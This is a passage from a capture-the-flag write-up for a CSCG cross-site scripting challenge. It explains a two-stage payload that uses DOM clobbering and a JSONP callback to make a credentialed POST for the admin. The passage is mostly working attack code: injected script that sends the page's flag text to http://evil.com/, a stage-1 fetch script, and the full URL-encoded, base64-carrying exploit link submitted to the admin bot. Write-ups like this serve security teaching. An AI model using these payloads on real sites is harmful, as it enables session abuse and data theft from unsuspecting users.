<input type="hidden" id="bg" value="id"><img name="backgrounds" id="<script>fetch(`http://evil.com/`+$(`b`).text())</script>"><!--">
```

To explain the parts of this payload:
- `value="id"` means we will read `backgrounds.id`
- `backgrounds` becomes a javascript variable containing our element
- `backgrounds.id` is thus the value of the `id` attribute of the `backgrounds` element
- This is javascript code that will get executed, and leak the value of the flag back to our endpoint.

Finally, we have a working payload! All that's left is to put it together.

We go back to stage 1, where we have to first send a POST request with

```
bg=id"><img name="backgrounds" id="<script>fetch(`http://evil.com/`%2B$(`b`).text())</script>"><!--
```

This will have to be done via a `fetch` request with no-cors (and thus an opaque response), and then we have to redirect the window. The javascript itself to do this is not difficult, but it turns out there's an extra layer of difficulty added as the callback has a 250-character limit. We get around this by simply using `location.hash` to store the Stage 2 payload (base64 encoded for good measure so we don't have to escape more HTML entities).

So our stage 1 payload is:
```
h=document.querySelector('ul a').href;fetch(h,{headers:{'Content-type':'application/x-www-form-urlencoded'},credentials:'include',mode:'no-cors',method:'POST',body:atob(location.hash.substring(1))});location.href=h;//
```
and our stage 2 payload (POST request to be base64 encoded) is:
```
bg=id"><img name="backgrounds" id="<script>fetch(`http://evil.com/`%2B$(`b`).text())</script>"><!--
```

Thus, the full link to be submitted, in all its glory, is:
```
http://xss.allesctf.net/?search=%3Cscript+src%3D%22%2Fitems.php%3Fcb%3Dh%3Ddocument.querySelector%28%27ul+a%27%29.href%3Bfetch%28h%2C%7Bheaders%3A%7B%27Content-type%27%3A%27application%2Fx-www-form-urlencoded%27%7D%2Ccredentials%3A%27include%27%2Cmode%3A%27no-cors%27%2Cmethod%3A%27POST%27%2Cbody%3Aatob%28location.hash.substring%281%29%29%7D%29%3Blocation.href%3Dh%3B%2F%2F%22%3E%3C%2Fscript%3E#Ymc9aWQiPjxpbWcgbmFtZT0iYmFja2dyb3VuZHMiIGlkPSI8c2NyaXB0PmZldGNoKGBodHRwOi8vZXZpbC5jb20vYCUyQiQoYGJgKS50ZXh0KCkpPC9zY3JpcHQ+Ij48IS0t
```

As a reward for submitting this link to the admin, the flag shows up on our simple http webserver and we are done.

The flag is `CSCG{c0ngratZ_y0u_l3arnD_sUm_jS:>}`.
